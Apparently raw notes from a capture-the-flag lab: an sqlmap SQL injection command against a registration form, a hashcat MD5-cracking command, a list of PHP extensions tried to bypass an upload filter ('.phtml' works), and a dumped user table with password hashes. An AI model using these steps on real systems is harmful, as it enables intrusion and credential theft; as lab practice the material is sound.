python3 sqlmap.py -u http://10.10.234.167/register.php --risk=3 --level=5    --batch --dbms=mysql -p log_email -D social --forms -T users --column

hashcat64 -m 0 ../../ucl_cs/reversing/hash rockyou.txt

[x] .php 
[x] .php3, 
[x] .php4
[x] .php5
[x] .php6
[x] .php7
[x] .phps
[x] .php-s
[x] .pht
[x] .phtm
yes!!! .phtml
[x] .phpt
[x] .phar
[x] .inc
[x] .jpg.php

Databases:
- social

Tables:
Database: social
[3 tables]
+----------+
| messages |
| trends   |
| users    |
+----------+

Database: social
Table: users
[10 entries]
+----+------------------------+----------------------------------+-----------------------+----------------+-----------+-----------+--------------+--------------------------------------------------------+-------------+-------------+--------------------------------------------------------------+
| id | email                  | password                         | username              | last_name      | num_likes | num_posts | first_name   | profile_pic                                            | signup_date | user_closed | friend_array                                                 |
+----+------------------------+----------------------------------+-----------------------+----------------+-----------+-----------+--------------+--------------------------------------------------------+-------------+-------------+--------------------------------------------------------------+
| 1  | bigman@shefesh.com     | f1267830a78c0b59acc06b05694b2e28 | santa_claus           | Claus          | 2         | 3         | Santa        | assets/images/profile_pics/defaults/head_deep_blue.png | 2019-12-22  | no          | ,mommy_mistletoe,arnold_schwarzenegger,johnfortnite_kennedy, |
| 2  | mmtoe@shefesh.com      | 402223cb4df4c5050a38043d38b1372b | mommy_mistletoe       | Mistletoe      | 0         | 3         | Mommy        | assets/images/profile_pics/defaults/head_emerald.png   | 2019-12-22  | no          | ,santa_claus,                                                |
| 3  | terminator@shefesh.com | 78a6d0e6c73a29ef6d07d56f32f67b30 | arnold_schwarzenegger | Schwarzenegger | 0         | 0         | Arnold       | assets/images/profile_pics/defaults/head_emerald.png   | 2019-12-22  | no          | ,santa_claus,johnfortnite_kennedy,                           |
| 4  | jayfkay@shefesh.com    | bc808149a93bc7050c3c6c4b7a5a0c97 | johnfortnite_kennedy  | Kennedy        | 0         | 1         | Johnfortnite | assets/images/profile_pics/defaults/head_emerald.png   | 2019-12-22  | no          | ,santa_claus,arnold_schwarzenegger,                          |
| 5  | john@keepingit.online  | aa4e356d1509f1c1f53e0191601cde72 | john_richardson       | Richardson     | 1         | 1         | John         | assets/images/profile_pics/defaults/head_emerald.png   | 2019-12-22  | no          | ,                                                            |
| 6  | notty@shefesh.com      | 6aff5ae0718de8945a3f71ba4d1ca76f | naughty_elf           | Elf            | 0         | 0         | Naughty      | assets/images/profile_pics/defaults/head_emerald.png   | 2019-12-22  | no          | ,                                                            |
| 7  | felixnav@shefesh.com   | 57e9eb182943223b0b4e7f17c5e4cb6e | felix_navidad         | Navidad        | 0         | 0         | Felix        | assets/images/profile_pics/defaults/head_emerald.png   | 2019-12-22  | no          | ,                                                            |
| 8  | mrsclaus@shefesh.com   | 15bc4f3ba871b2fa651363dcddfb27d9 | jessica_claus         | Claus          | 0         | 1         | Jessica      | assets/images/profile_pics/defaults/head_deep_blue.png | 2019-12-22  | no          | ,                                                            |
| 9  | mailman@shefesh.com    | a60c0662c54bde0301d9aa2ad86203df | myron_larabee         | Larabee        | 0         | 1         | Myron        | assets/images/profile_pics/defaults/head_deep_blue.png | 2019-12-22  | no          | ,                                                            |
| 10 | asd@asd.asd            | a8f5f167f44f4964e6c998dee827110c | asd_asd               | Asd            | 0         | 0         | Asd          | assets/images/profile_pics/defaults/head_emerald.png   | 2019-12-24  | no          | ,                                                            |
+----+------------------------+----------------------------------+-----------------------+----------------+-----------+-----------+--------------+--------------------------------------------------------+-------------+-------------+--------------------------------------------------------------+